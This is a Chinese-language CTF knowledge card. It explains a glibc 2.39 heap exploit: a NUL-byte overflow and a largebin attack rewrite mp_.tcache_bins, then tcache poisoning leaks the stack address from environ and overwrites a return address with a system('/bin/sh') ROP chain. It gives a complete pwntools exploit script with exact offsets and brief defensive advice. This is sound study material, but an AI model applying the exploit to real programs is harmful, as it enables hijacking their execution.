---
id: binary-pwn-heap-largebin-attack-mp-tcache-bins-stack-rop
title: glibc 2.39 largebin attack 改写 mp_.tcache_bins：放大 tcache 上限后毒化栈返回地址
type: scenario
domain: binary
path: binary/pwn/heap
technique: largebin-attack-mp-tcache-bins
aliases:
- largebin attack mp_
- mp_.tcache_bins
- malloc_par 劫持
- glibc 2.39 largebin
- tcache_bins 放大
- 大 chunk tcache poisoning
- NCTF ezheap
tags:
- pwn
- heap
- glibc
- largebin
- tcache
- mp
- stack
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:42:53+08:00'
  notes: 已对照原文与图11-21核对：add 限 0x450-0x550、edit 在 read 后写 \0、show 用 write；unsorted 泄露 libc(0x203B20)、两组 overlap、largebin attack 目标 libc+0x2031E8-0x20、environs 0x20AD58、edit 返回地址 environ-0x150、ROP 偏移均与 exp/截图一致。原文将 mp_.tcache_bins 标注为 0x40 并改成 0x408，实际 largebin attack 写入为 chunk 指针（值更大），不影响结论但偏移需按目标 libc 核对。未设 affected_versions：2.39 仅为靶场 libc，原文未给影响区间；frontmatter无sources/source_url。
---

## 一句话结论

在 glibc 2.39 Full RELRO/PIE/canary 的堆题里，`malloc` 只允许 0x450–0x550 的大 chunk，`edit` 在 `read` 返回后写一个 `\0` 形成 1 字节 NUL 溢出；利用两处 chunk overlap 和 largebin attack 把 `libc` 的 `mp_.tcache_bins`（`malloc_par` 中控制 tcache bin 上限的字段，默认 0x40）改成很大的值（如 0x408），让原本进不了 tcache 的大 chunk 进入 tcache；随后用 tcache poisoning 把 chunk 分配到 `environ` 附近泄露栈地址，再把 `edit` 的返回地址覆盖成 `ret`/`pop rdi`/`"/bin/sh"`/`system` 的 ROP 链拿 shell。

## 原理

- **题目原语**：`add` 只接受 0x450 < size <= 0x550，最多 0x20 个索引；`edit` 执行 `buf[read(0, buf, sizes[idx])] = 0;`，当输入正好填满 chunk 时会在末尾写一个 NUL，溢出到下一个 chunk 的 `size` 最低字节（如 0x501 → 0x500），制造重叠/伪造 size 的机会；`show` 用 `write(1, chunk, size)`，可泄露堆/libc 指针。
- **libc 泄露**：free 一个大于 tcache 上限的 chunk 进入 unsorted bin，`show` 读出 `main_arena` 指针，计算 libc 基址（原文偏移 0x203B20）。
- **堆地址泄露/overlap**：用 largebin 的 `fd/bk` 或 `fd_nextsize/bk_nextsize` 读出堆地址；通过 NUL 溢出修改相邻 chunk 的 size，free/再分配形成两个重叠组（原文两组 base=0/10），为 largebin attack 和反复任意地址分配做准备。
- **largebin attack**：把一个 largebin chunk 的 `bk_nextsize` 改成目标地址 - 0x20，再插入一个更小的 chunk 触发链表更新，glibc 会把 chunk 地址写到目标（经典 largebin attack）。原文目标为 `libc_base + 0x2031E8 - 0x20`，即 `mp_.tcache_bins` 附近。
- **`mp_.tcache_bins`**：`mp_` 是 libc 的 `malloc_par`，`tcache_bins` 决定 tcache 支持的最大 bin 索引（默认 64/0x40）。把它改成 0x408（或其他大值）后，0x450–0x550 的大 chunk 也能进入 tcache，从而可以用 tcache poisoning 把 next 指针指向任意地址。
- **tcache poisoning + 栈**：glibc 2.39 有 safe-linking，tcache next 需编码为 `(chunk_addr >> 12) ^ target`；先把 target 设为 `environ - 0x28` 附近，分配后读出 `environ` 的栈指针；再把 target 设为 `edit` 返回地址 - 0x28，分配/编辑把 ROP 链写到返回地址，`edit` 返回时执行。
- **ROP**：`ret`（栈对齐）、`pop rdi; ret`、`"/bin/sh"`、`system`；地址来自 libc 基址（原文 system=0x58750、binsh=0x1CB42F、pop_rdi=0x10F78B、ret=0x2882F，均为该 libc 偏移）。
- **为什么可行**：largebin attack 提供一次“任意地址写一个 chunk 指针”，选 `mp_` 这种全局可写结构可改变 allocator 行为；`tcache_bins` 放大后大 chunk 可被 tcache 管理，再用 poison 获得任意地址分配；`environ` 泄露栈后直接覆盖返回地址，绕过 Full RELRO（不打 GOT/hook）。
- **版本与偏移**：`mp_`、`tcache_bins`、`environ`、`main_arena` 偏移随 glibc 版本变化；原文为 glibc 2.39 的特定 libc，其他版本需重新核对。glibc 2.34+ 无 `__free_hook`，本路线不依赖 hook。

## 触发条件

- glibc 2.39（或相近版本），Full RELRO、PIE、Canary、NX；`add` 只允许大 chunk（0x450–0x550），`edit` 有 1 字节 NUL 溢出，`show` 用 `write` 输出。
- 能通过 unsorted/largebin 泄露 libc 与堆地址；能构造两组 overlap 并触发 largebin attack。
- `mp_.tcache_bins` 地址可由 libc 基址 + 固定偏移得到；largebin attack 目标可写。
- 目标返回地址（如 `edit` 的栈帧）可通过 `environ` 泄露并定位；有足够栈空间放 ROP。
- 需要准确计算 `request2size`、safe-linking 编码和 chunk 对齐；堆风水对顺序敏感。

## 利用步骤

1. 申请/释放 0x4F8 的大 chunk，`show` 读 unsorted bin 的 `main_arena` 指针，计算 libc 基址。
2. 构造第一组 overlap：按 0x468/0x4F8/0x548/0x450 等大小申请，free 后用 NUL 溢出改 size，再申请形成重叠；`show` 泄露堆地址（`fd/bk`/`fd_nextsize`）。
3. 构造第二组 overlap（不同尺寸），为 largebin attack 和后续任意地址分配准备。
4. 把第一组 largebin chunk 的 `fd_nextsize/bk_nextsize` 改为 `libc_base + 0x2031E8 - 0x20`（`mp_.tcache_bins` 目标），插入较小 chunk 触发 largebin attack，使 `mp_.tcache_bins` 变成一个大值（如 0x408）。
5. 用 tcache poisoning 把 next 指向 `libc_base + 0x20AD58 - 0x28`（environ 附近），分配两次后 `show` 读出 `environ` 栈地址。
6. 计算 `edit` 返回地址（原文 `environ - 0x150`），再用 tcache poisoning 把 next 指向返回地址 - 0x28，分配并 `edit` 写入 ROP：`ret`、`pop rdi`、`/bin/sh`、`system`。
7. 触发 `edit` 返回，执行 `system("/bin/sh")`；若失败，用 GDB 检查 `mp_.tcache_bins` 是否被改写、tcache 链是否 safe-linking 编码正确、返回地址偏移是否随 libc 变化。

## PoC

```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io = process('./pwn')

sizes = {}
def request2size(req):
    return (req + 8 + 0xF) & ~0xF
def enc(pos, ptr):
    return (pos >> 12) ^ ptr
def qword(b):
    return u64(b.ljust(8, b'\0'))

def choice(v):
    io.sendlineafter(b'choice >> ', str(v).encode())
def add(idx, size):
    choice(1); io.sendlineafter(b'idx : ', str(idx).encode())
    io.sendlineafter(b'size : ', str(size).encode()); io.recvuntil(b'done\n')
    sizes[idx] = size
def edit(idx, data):
    choice(2); io.sendlineafter(b'idx : ', str(idx).encode())
    io.recvuntil(b'content : '); io.send(data); io.recvuntil(b'done\n')
def delete(idx):
    choice(3); io.sendlineafter(b'idx : ', str(idx).encode()); io.recvuntil(b'done\n')
def show(idx):
    choice(4); io.sendlineafter(b'idx : ', str(idx).encode())
    data = io.recvn(sizes[idx]); io.recvuntil(b'done\n'); io.recvuntil(b'invalid\n')
    return data

# 1) libc leak
add(24, 0x4F8); add(25, 0x4F8); delete(24); add(26, 0x4F8)
libc_base = qword(show(26)[:8]) - 0x203B20

# 2) 第一组 overlap + 堆泄露
base = 0
add(base+0, 0x468); add(base+1, 0x4F8); add(base+2, 0x548); add(base+3, 0x450)
delete(base+0); add(base+4, 0x478); add(base+5, 0x468)
leak = show(base+5)
p1_user = qword(leak[0x10:0x18])
payload = flat(p1_user, p1_user, 0, 0, b'A'*(0x468-0x20-8), request2size(0x468))
edit(base+5, payload)
delete(base+1)
add(base+6, 0x468); add(base+7, request2size(0x4F8)-0x10)

# 3) 第二组 overlap
base = 10
add(base+0, 0x518); add(base+1, 0x4F8); add(base+2, 0x548); add(base+3, 0x4F8)
delete(base+0); add(base+4, 0x548); add(base+5, 0x518)
leak = show(base+5); pois_p1_user = qword(leak[0x10:0x18])
payload = flat(pois_p1_user, pois_p1_user, 0, 0, b'A'*(0x518-0x20-8), request2size(0x518))
edit(base+5, payload)
delete(base+1)
add(base+6, 0x518); add(base+7, request2size(0x4F8)-0x10)

# 4) largebin attack -> mp_.tcache_bins
base = 0
delete(base+6); add(base+8, 0x478); delete(base+3)
freed = show(base+5)
forged = bytearray(freed[:0x20])
forged[0x18:0x20] = p64(libc_base + 0x2031E8 - 0x20)
edit(base+5, bytes(forged))
add(base+9, 0x478)

# 5) tcache poison -> environ -> 栈返回地址 -> ROP
target = (libc_base + 0x20AD58 - 0x28) & ~0xF
add(20, 0x518); delete(20); delete(16)
edit(15, p64(enc(pois_p1_user, target)))
add(21, 0x518); add(22, 0x518)
stack_env = qword(show(22)[0x28:0x30])
edit_rip = stack_env - 0x150
target = (edit_rip - 0x28) & ~0xF
rip_off = edit_rip - target
add(20, 0x518); delete(20); delete(21)
edit(15, p64(enc(pois_p1_user, target)))
add(21, 0x518); add(22, 0x518)

payload = flat({rip_off - 8: 0,
               rip_off + 0x20: libc_base + 0x2882F,       # ret
               rip_off + 0x28: libc_base + 0x10F78B,     # pop rdi; ret
               rip_off + 0x30: libc_base + 0x1CB42F,     # "/bin/sh"
               rip_off + 0x38: libc_base + 0x58750})     # system
edit(21, payload)
io.interactive()
```

```text
# 关键偏移（原文 glibc 2.39 示例，需按目标 libc 核对）：
# libc leak offset 0x203B20；mp_.tcache_bins 附近 0x2031E8；environ 0x20AD58；
# system 0x58750；binsh 0x1CB42F；pop rdi 0x10F78B；ret 0x2882F。
# largebin attack 把 chunk 指针写到 mp_.tcache_bins - 0x20，使其变为大值。
```

## 变体与关联

- **变体：打 IO/FSOP**：如果题目给了 exit，也可走 largebin attack 改 `_IO_list_all`/`_IO_2_1_stderr_` 的 FSOP；本卡选择 `mp_` 改变 allocator 行为。
- **变体：打 `__free_hook`/`__malloc_hook`**：旧 glibc 有 hook 时更直接；2.39 无 hook，需 `mp_`/`exit_funcs`/FSOP。
- **变体：largebin attack 目标**：`mp_.tcache_bins`、`_IO_list_all`、`global_max_fast`、`mp_.tcache_count` 等；不同目标对应不同后续原语。
- **关联卡片**：[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（environ 泄露 + tcache 毒化栈 ROP）、[[binary-pwn-heap-house-of-apple-2-stderr-fsop]]（FSOP 变体）、[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（新版 glibc tcache 安全机制）。
- **边界**：`mp_`/`environ` 偏移随 libc 变化；safe-linking 编码错误会崩；Full RELRO 阻止 GOT 路线；堆风水/两组 overlap 顺序敏感；`tcache_bins` 过大可能导致异常分配行为。

## 检测与防御

- **分配器加固**：使用 glibc 2.39+ 的 safe-linking、tcache key；监控 `mp_`/`malloc_par` 是否被写、`tcache_bins` 是否异常；启用 `MALLOC_CHECK_`/ASAN。
- **代码修复**：`edit` 的 `buf[read(...)] = 0` 应检查 `read` 返回值与 `size`，不要越界写；`add` 对 size/idx 做严格校验；`show` 限制长度。
- **编译加固**：Full RELRO + PIE + Canary + NX 仍是基础，但本手法绕过 GOT/hook；需结合 allocator 加固与堆完整性检查。
- **CTF/研究**：用 GDB 观察 largebin `bk_nextsize` 与 `mp_` 改写效果；记录 `environ`/返回地址偏移，便于迁移。
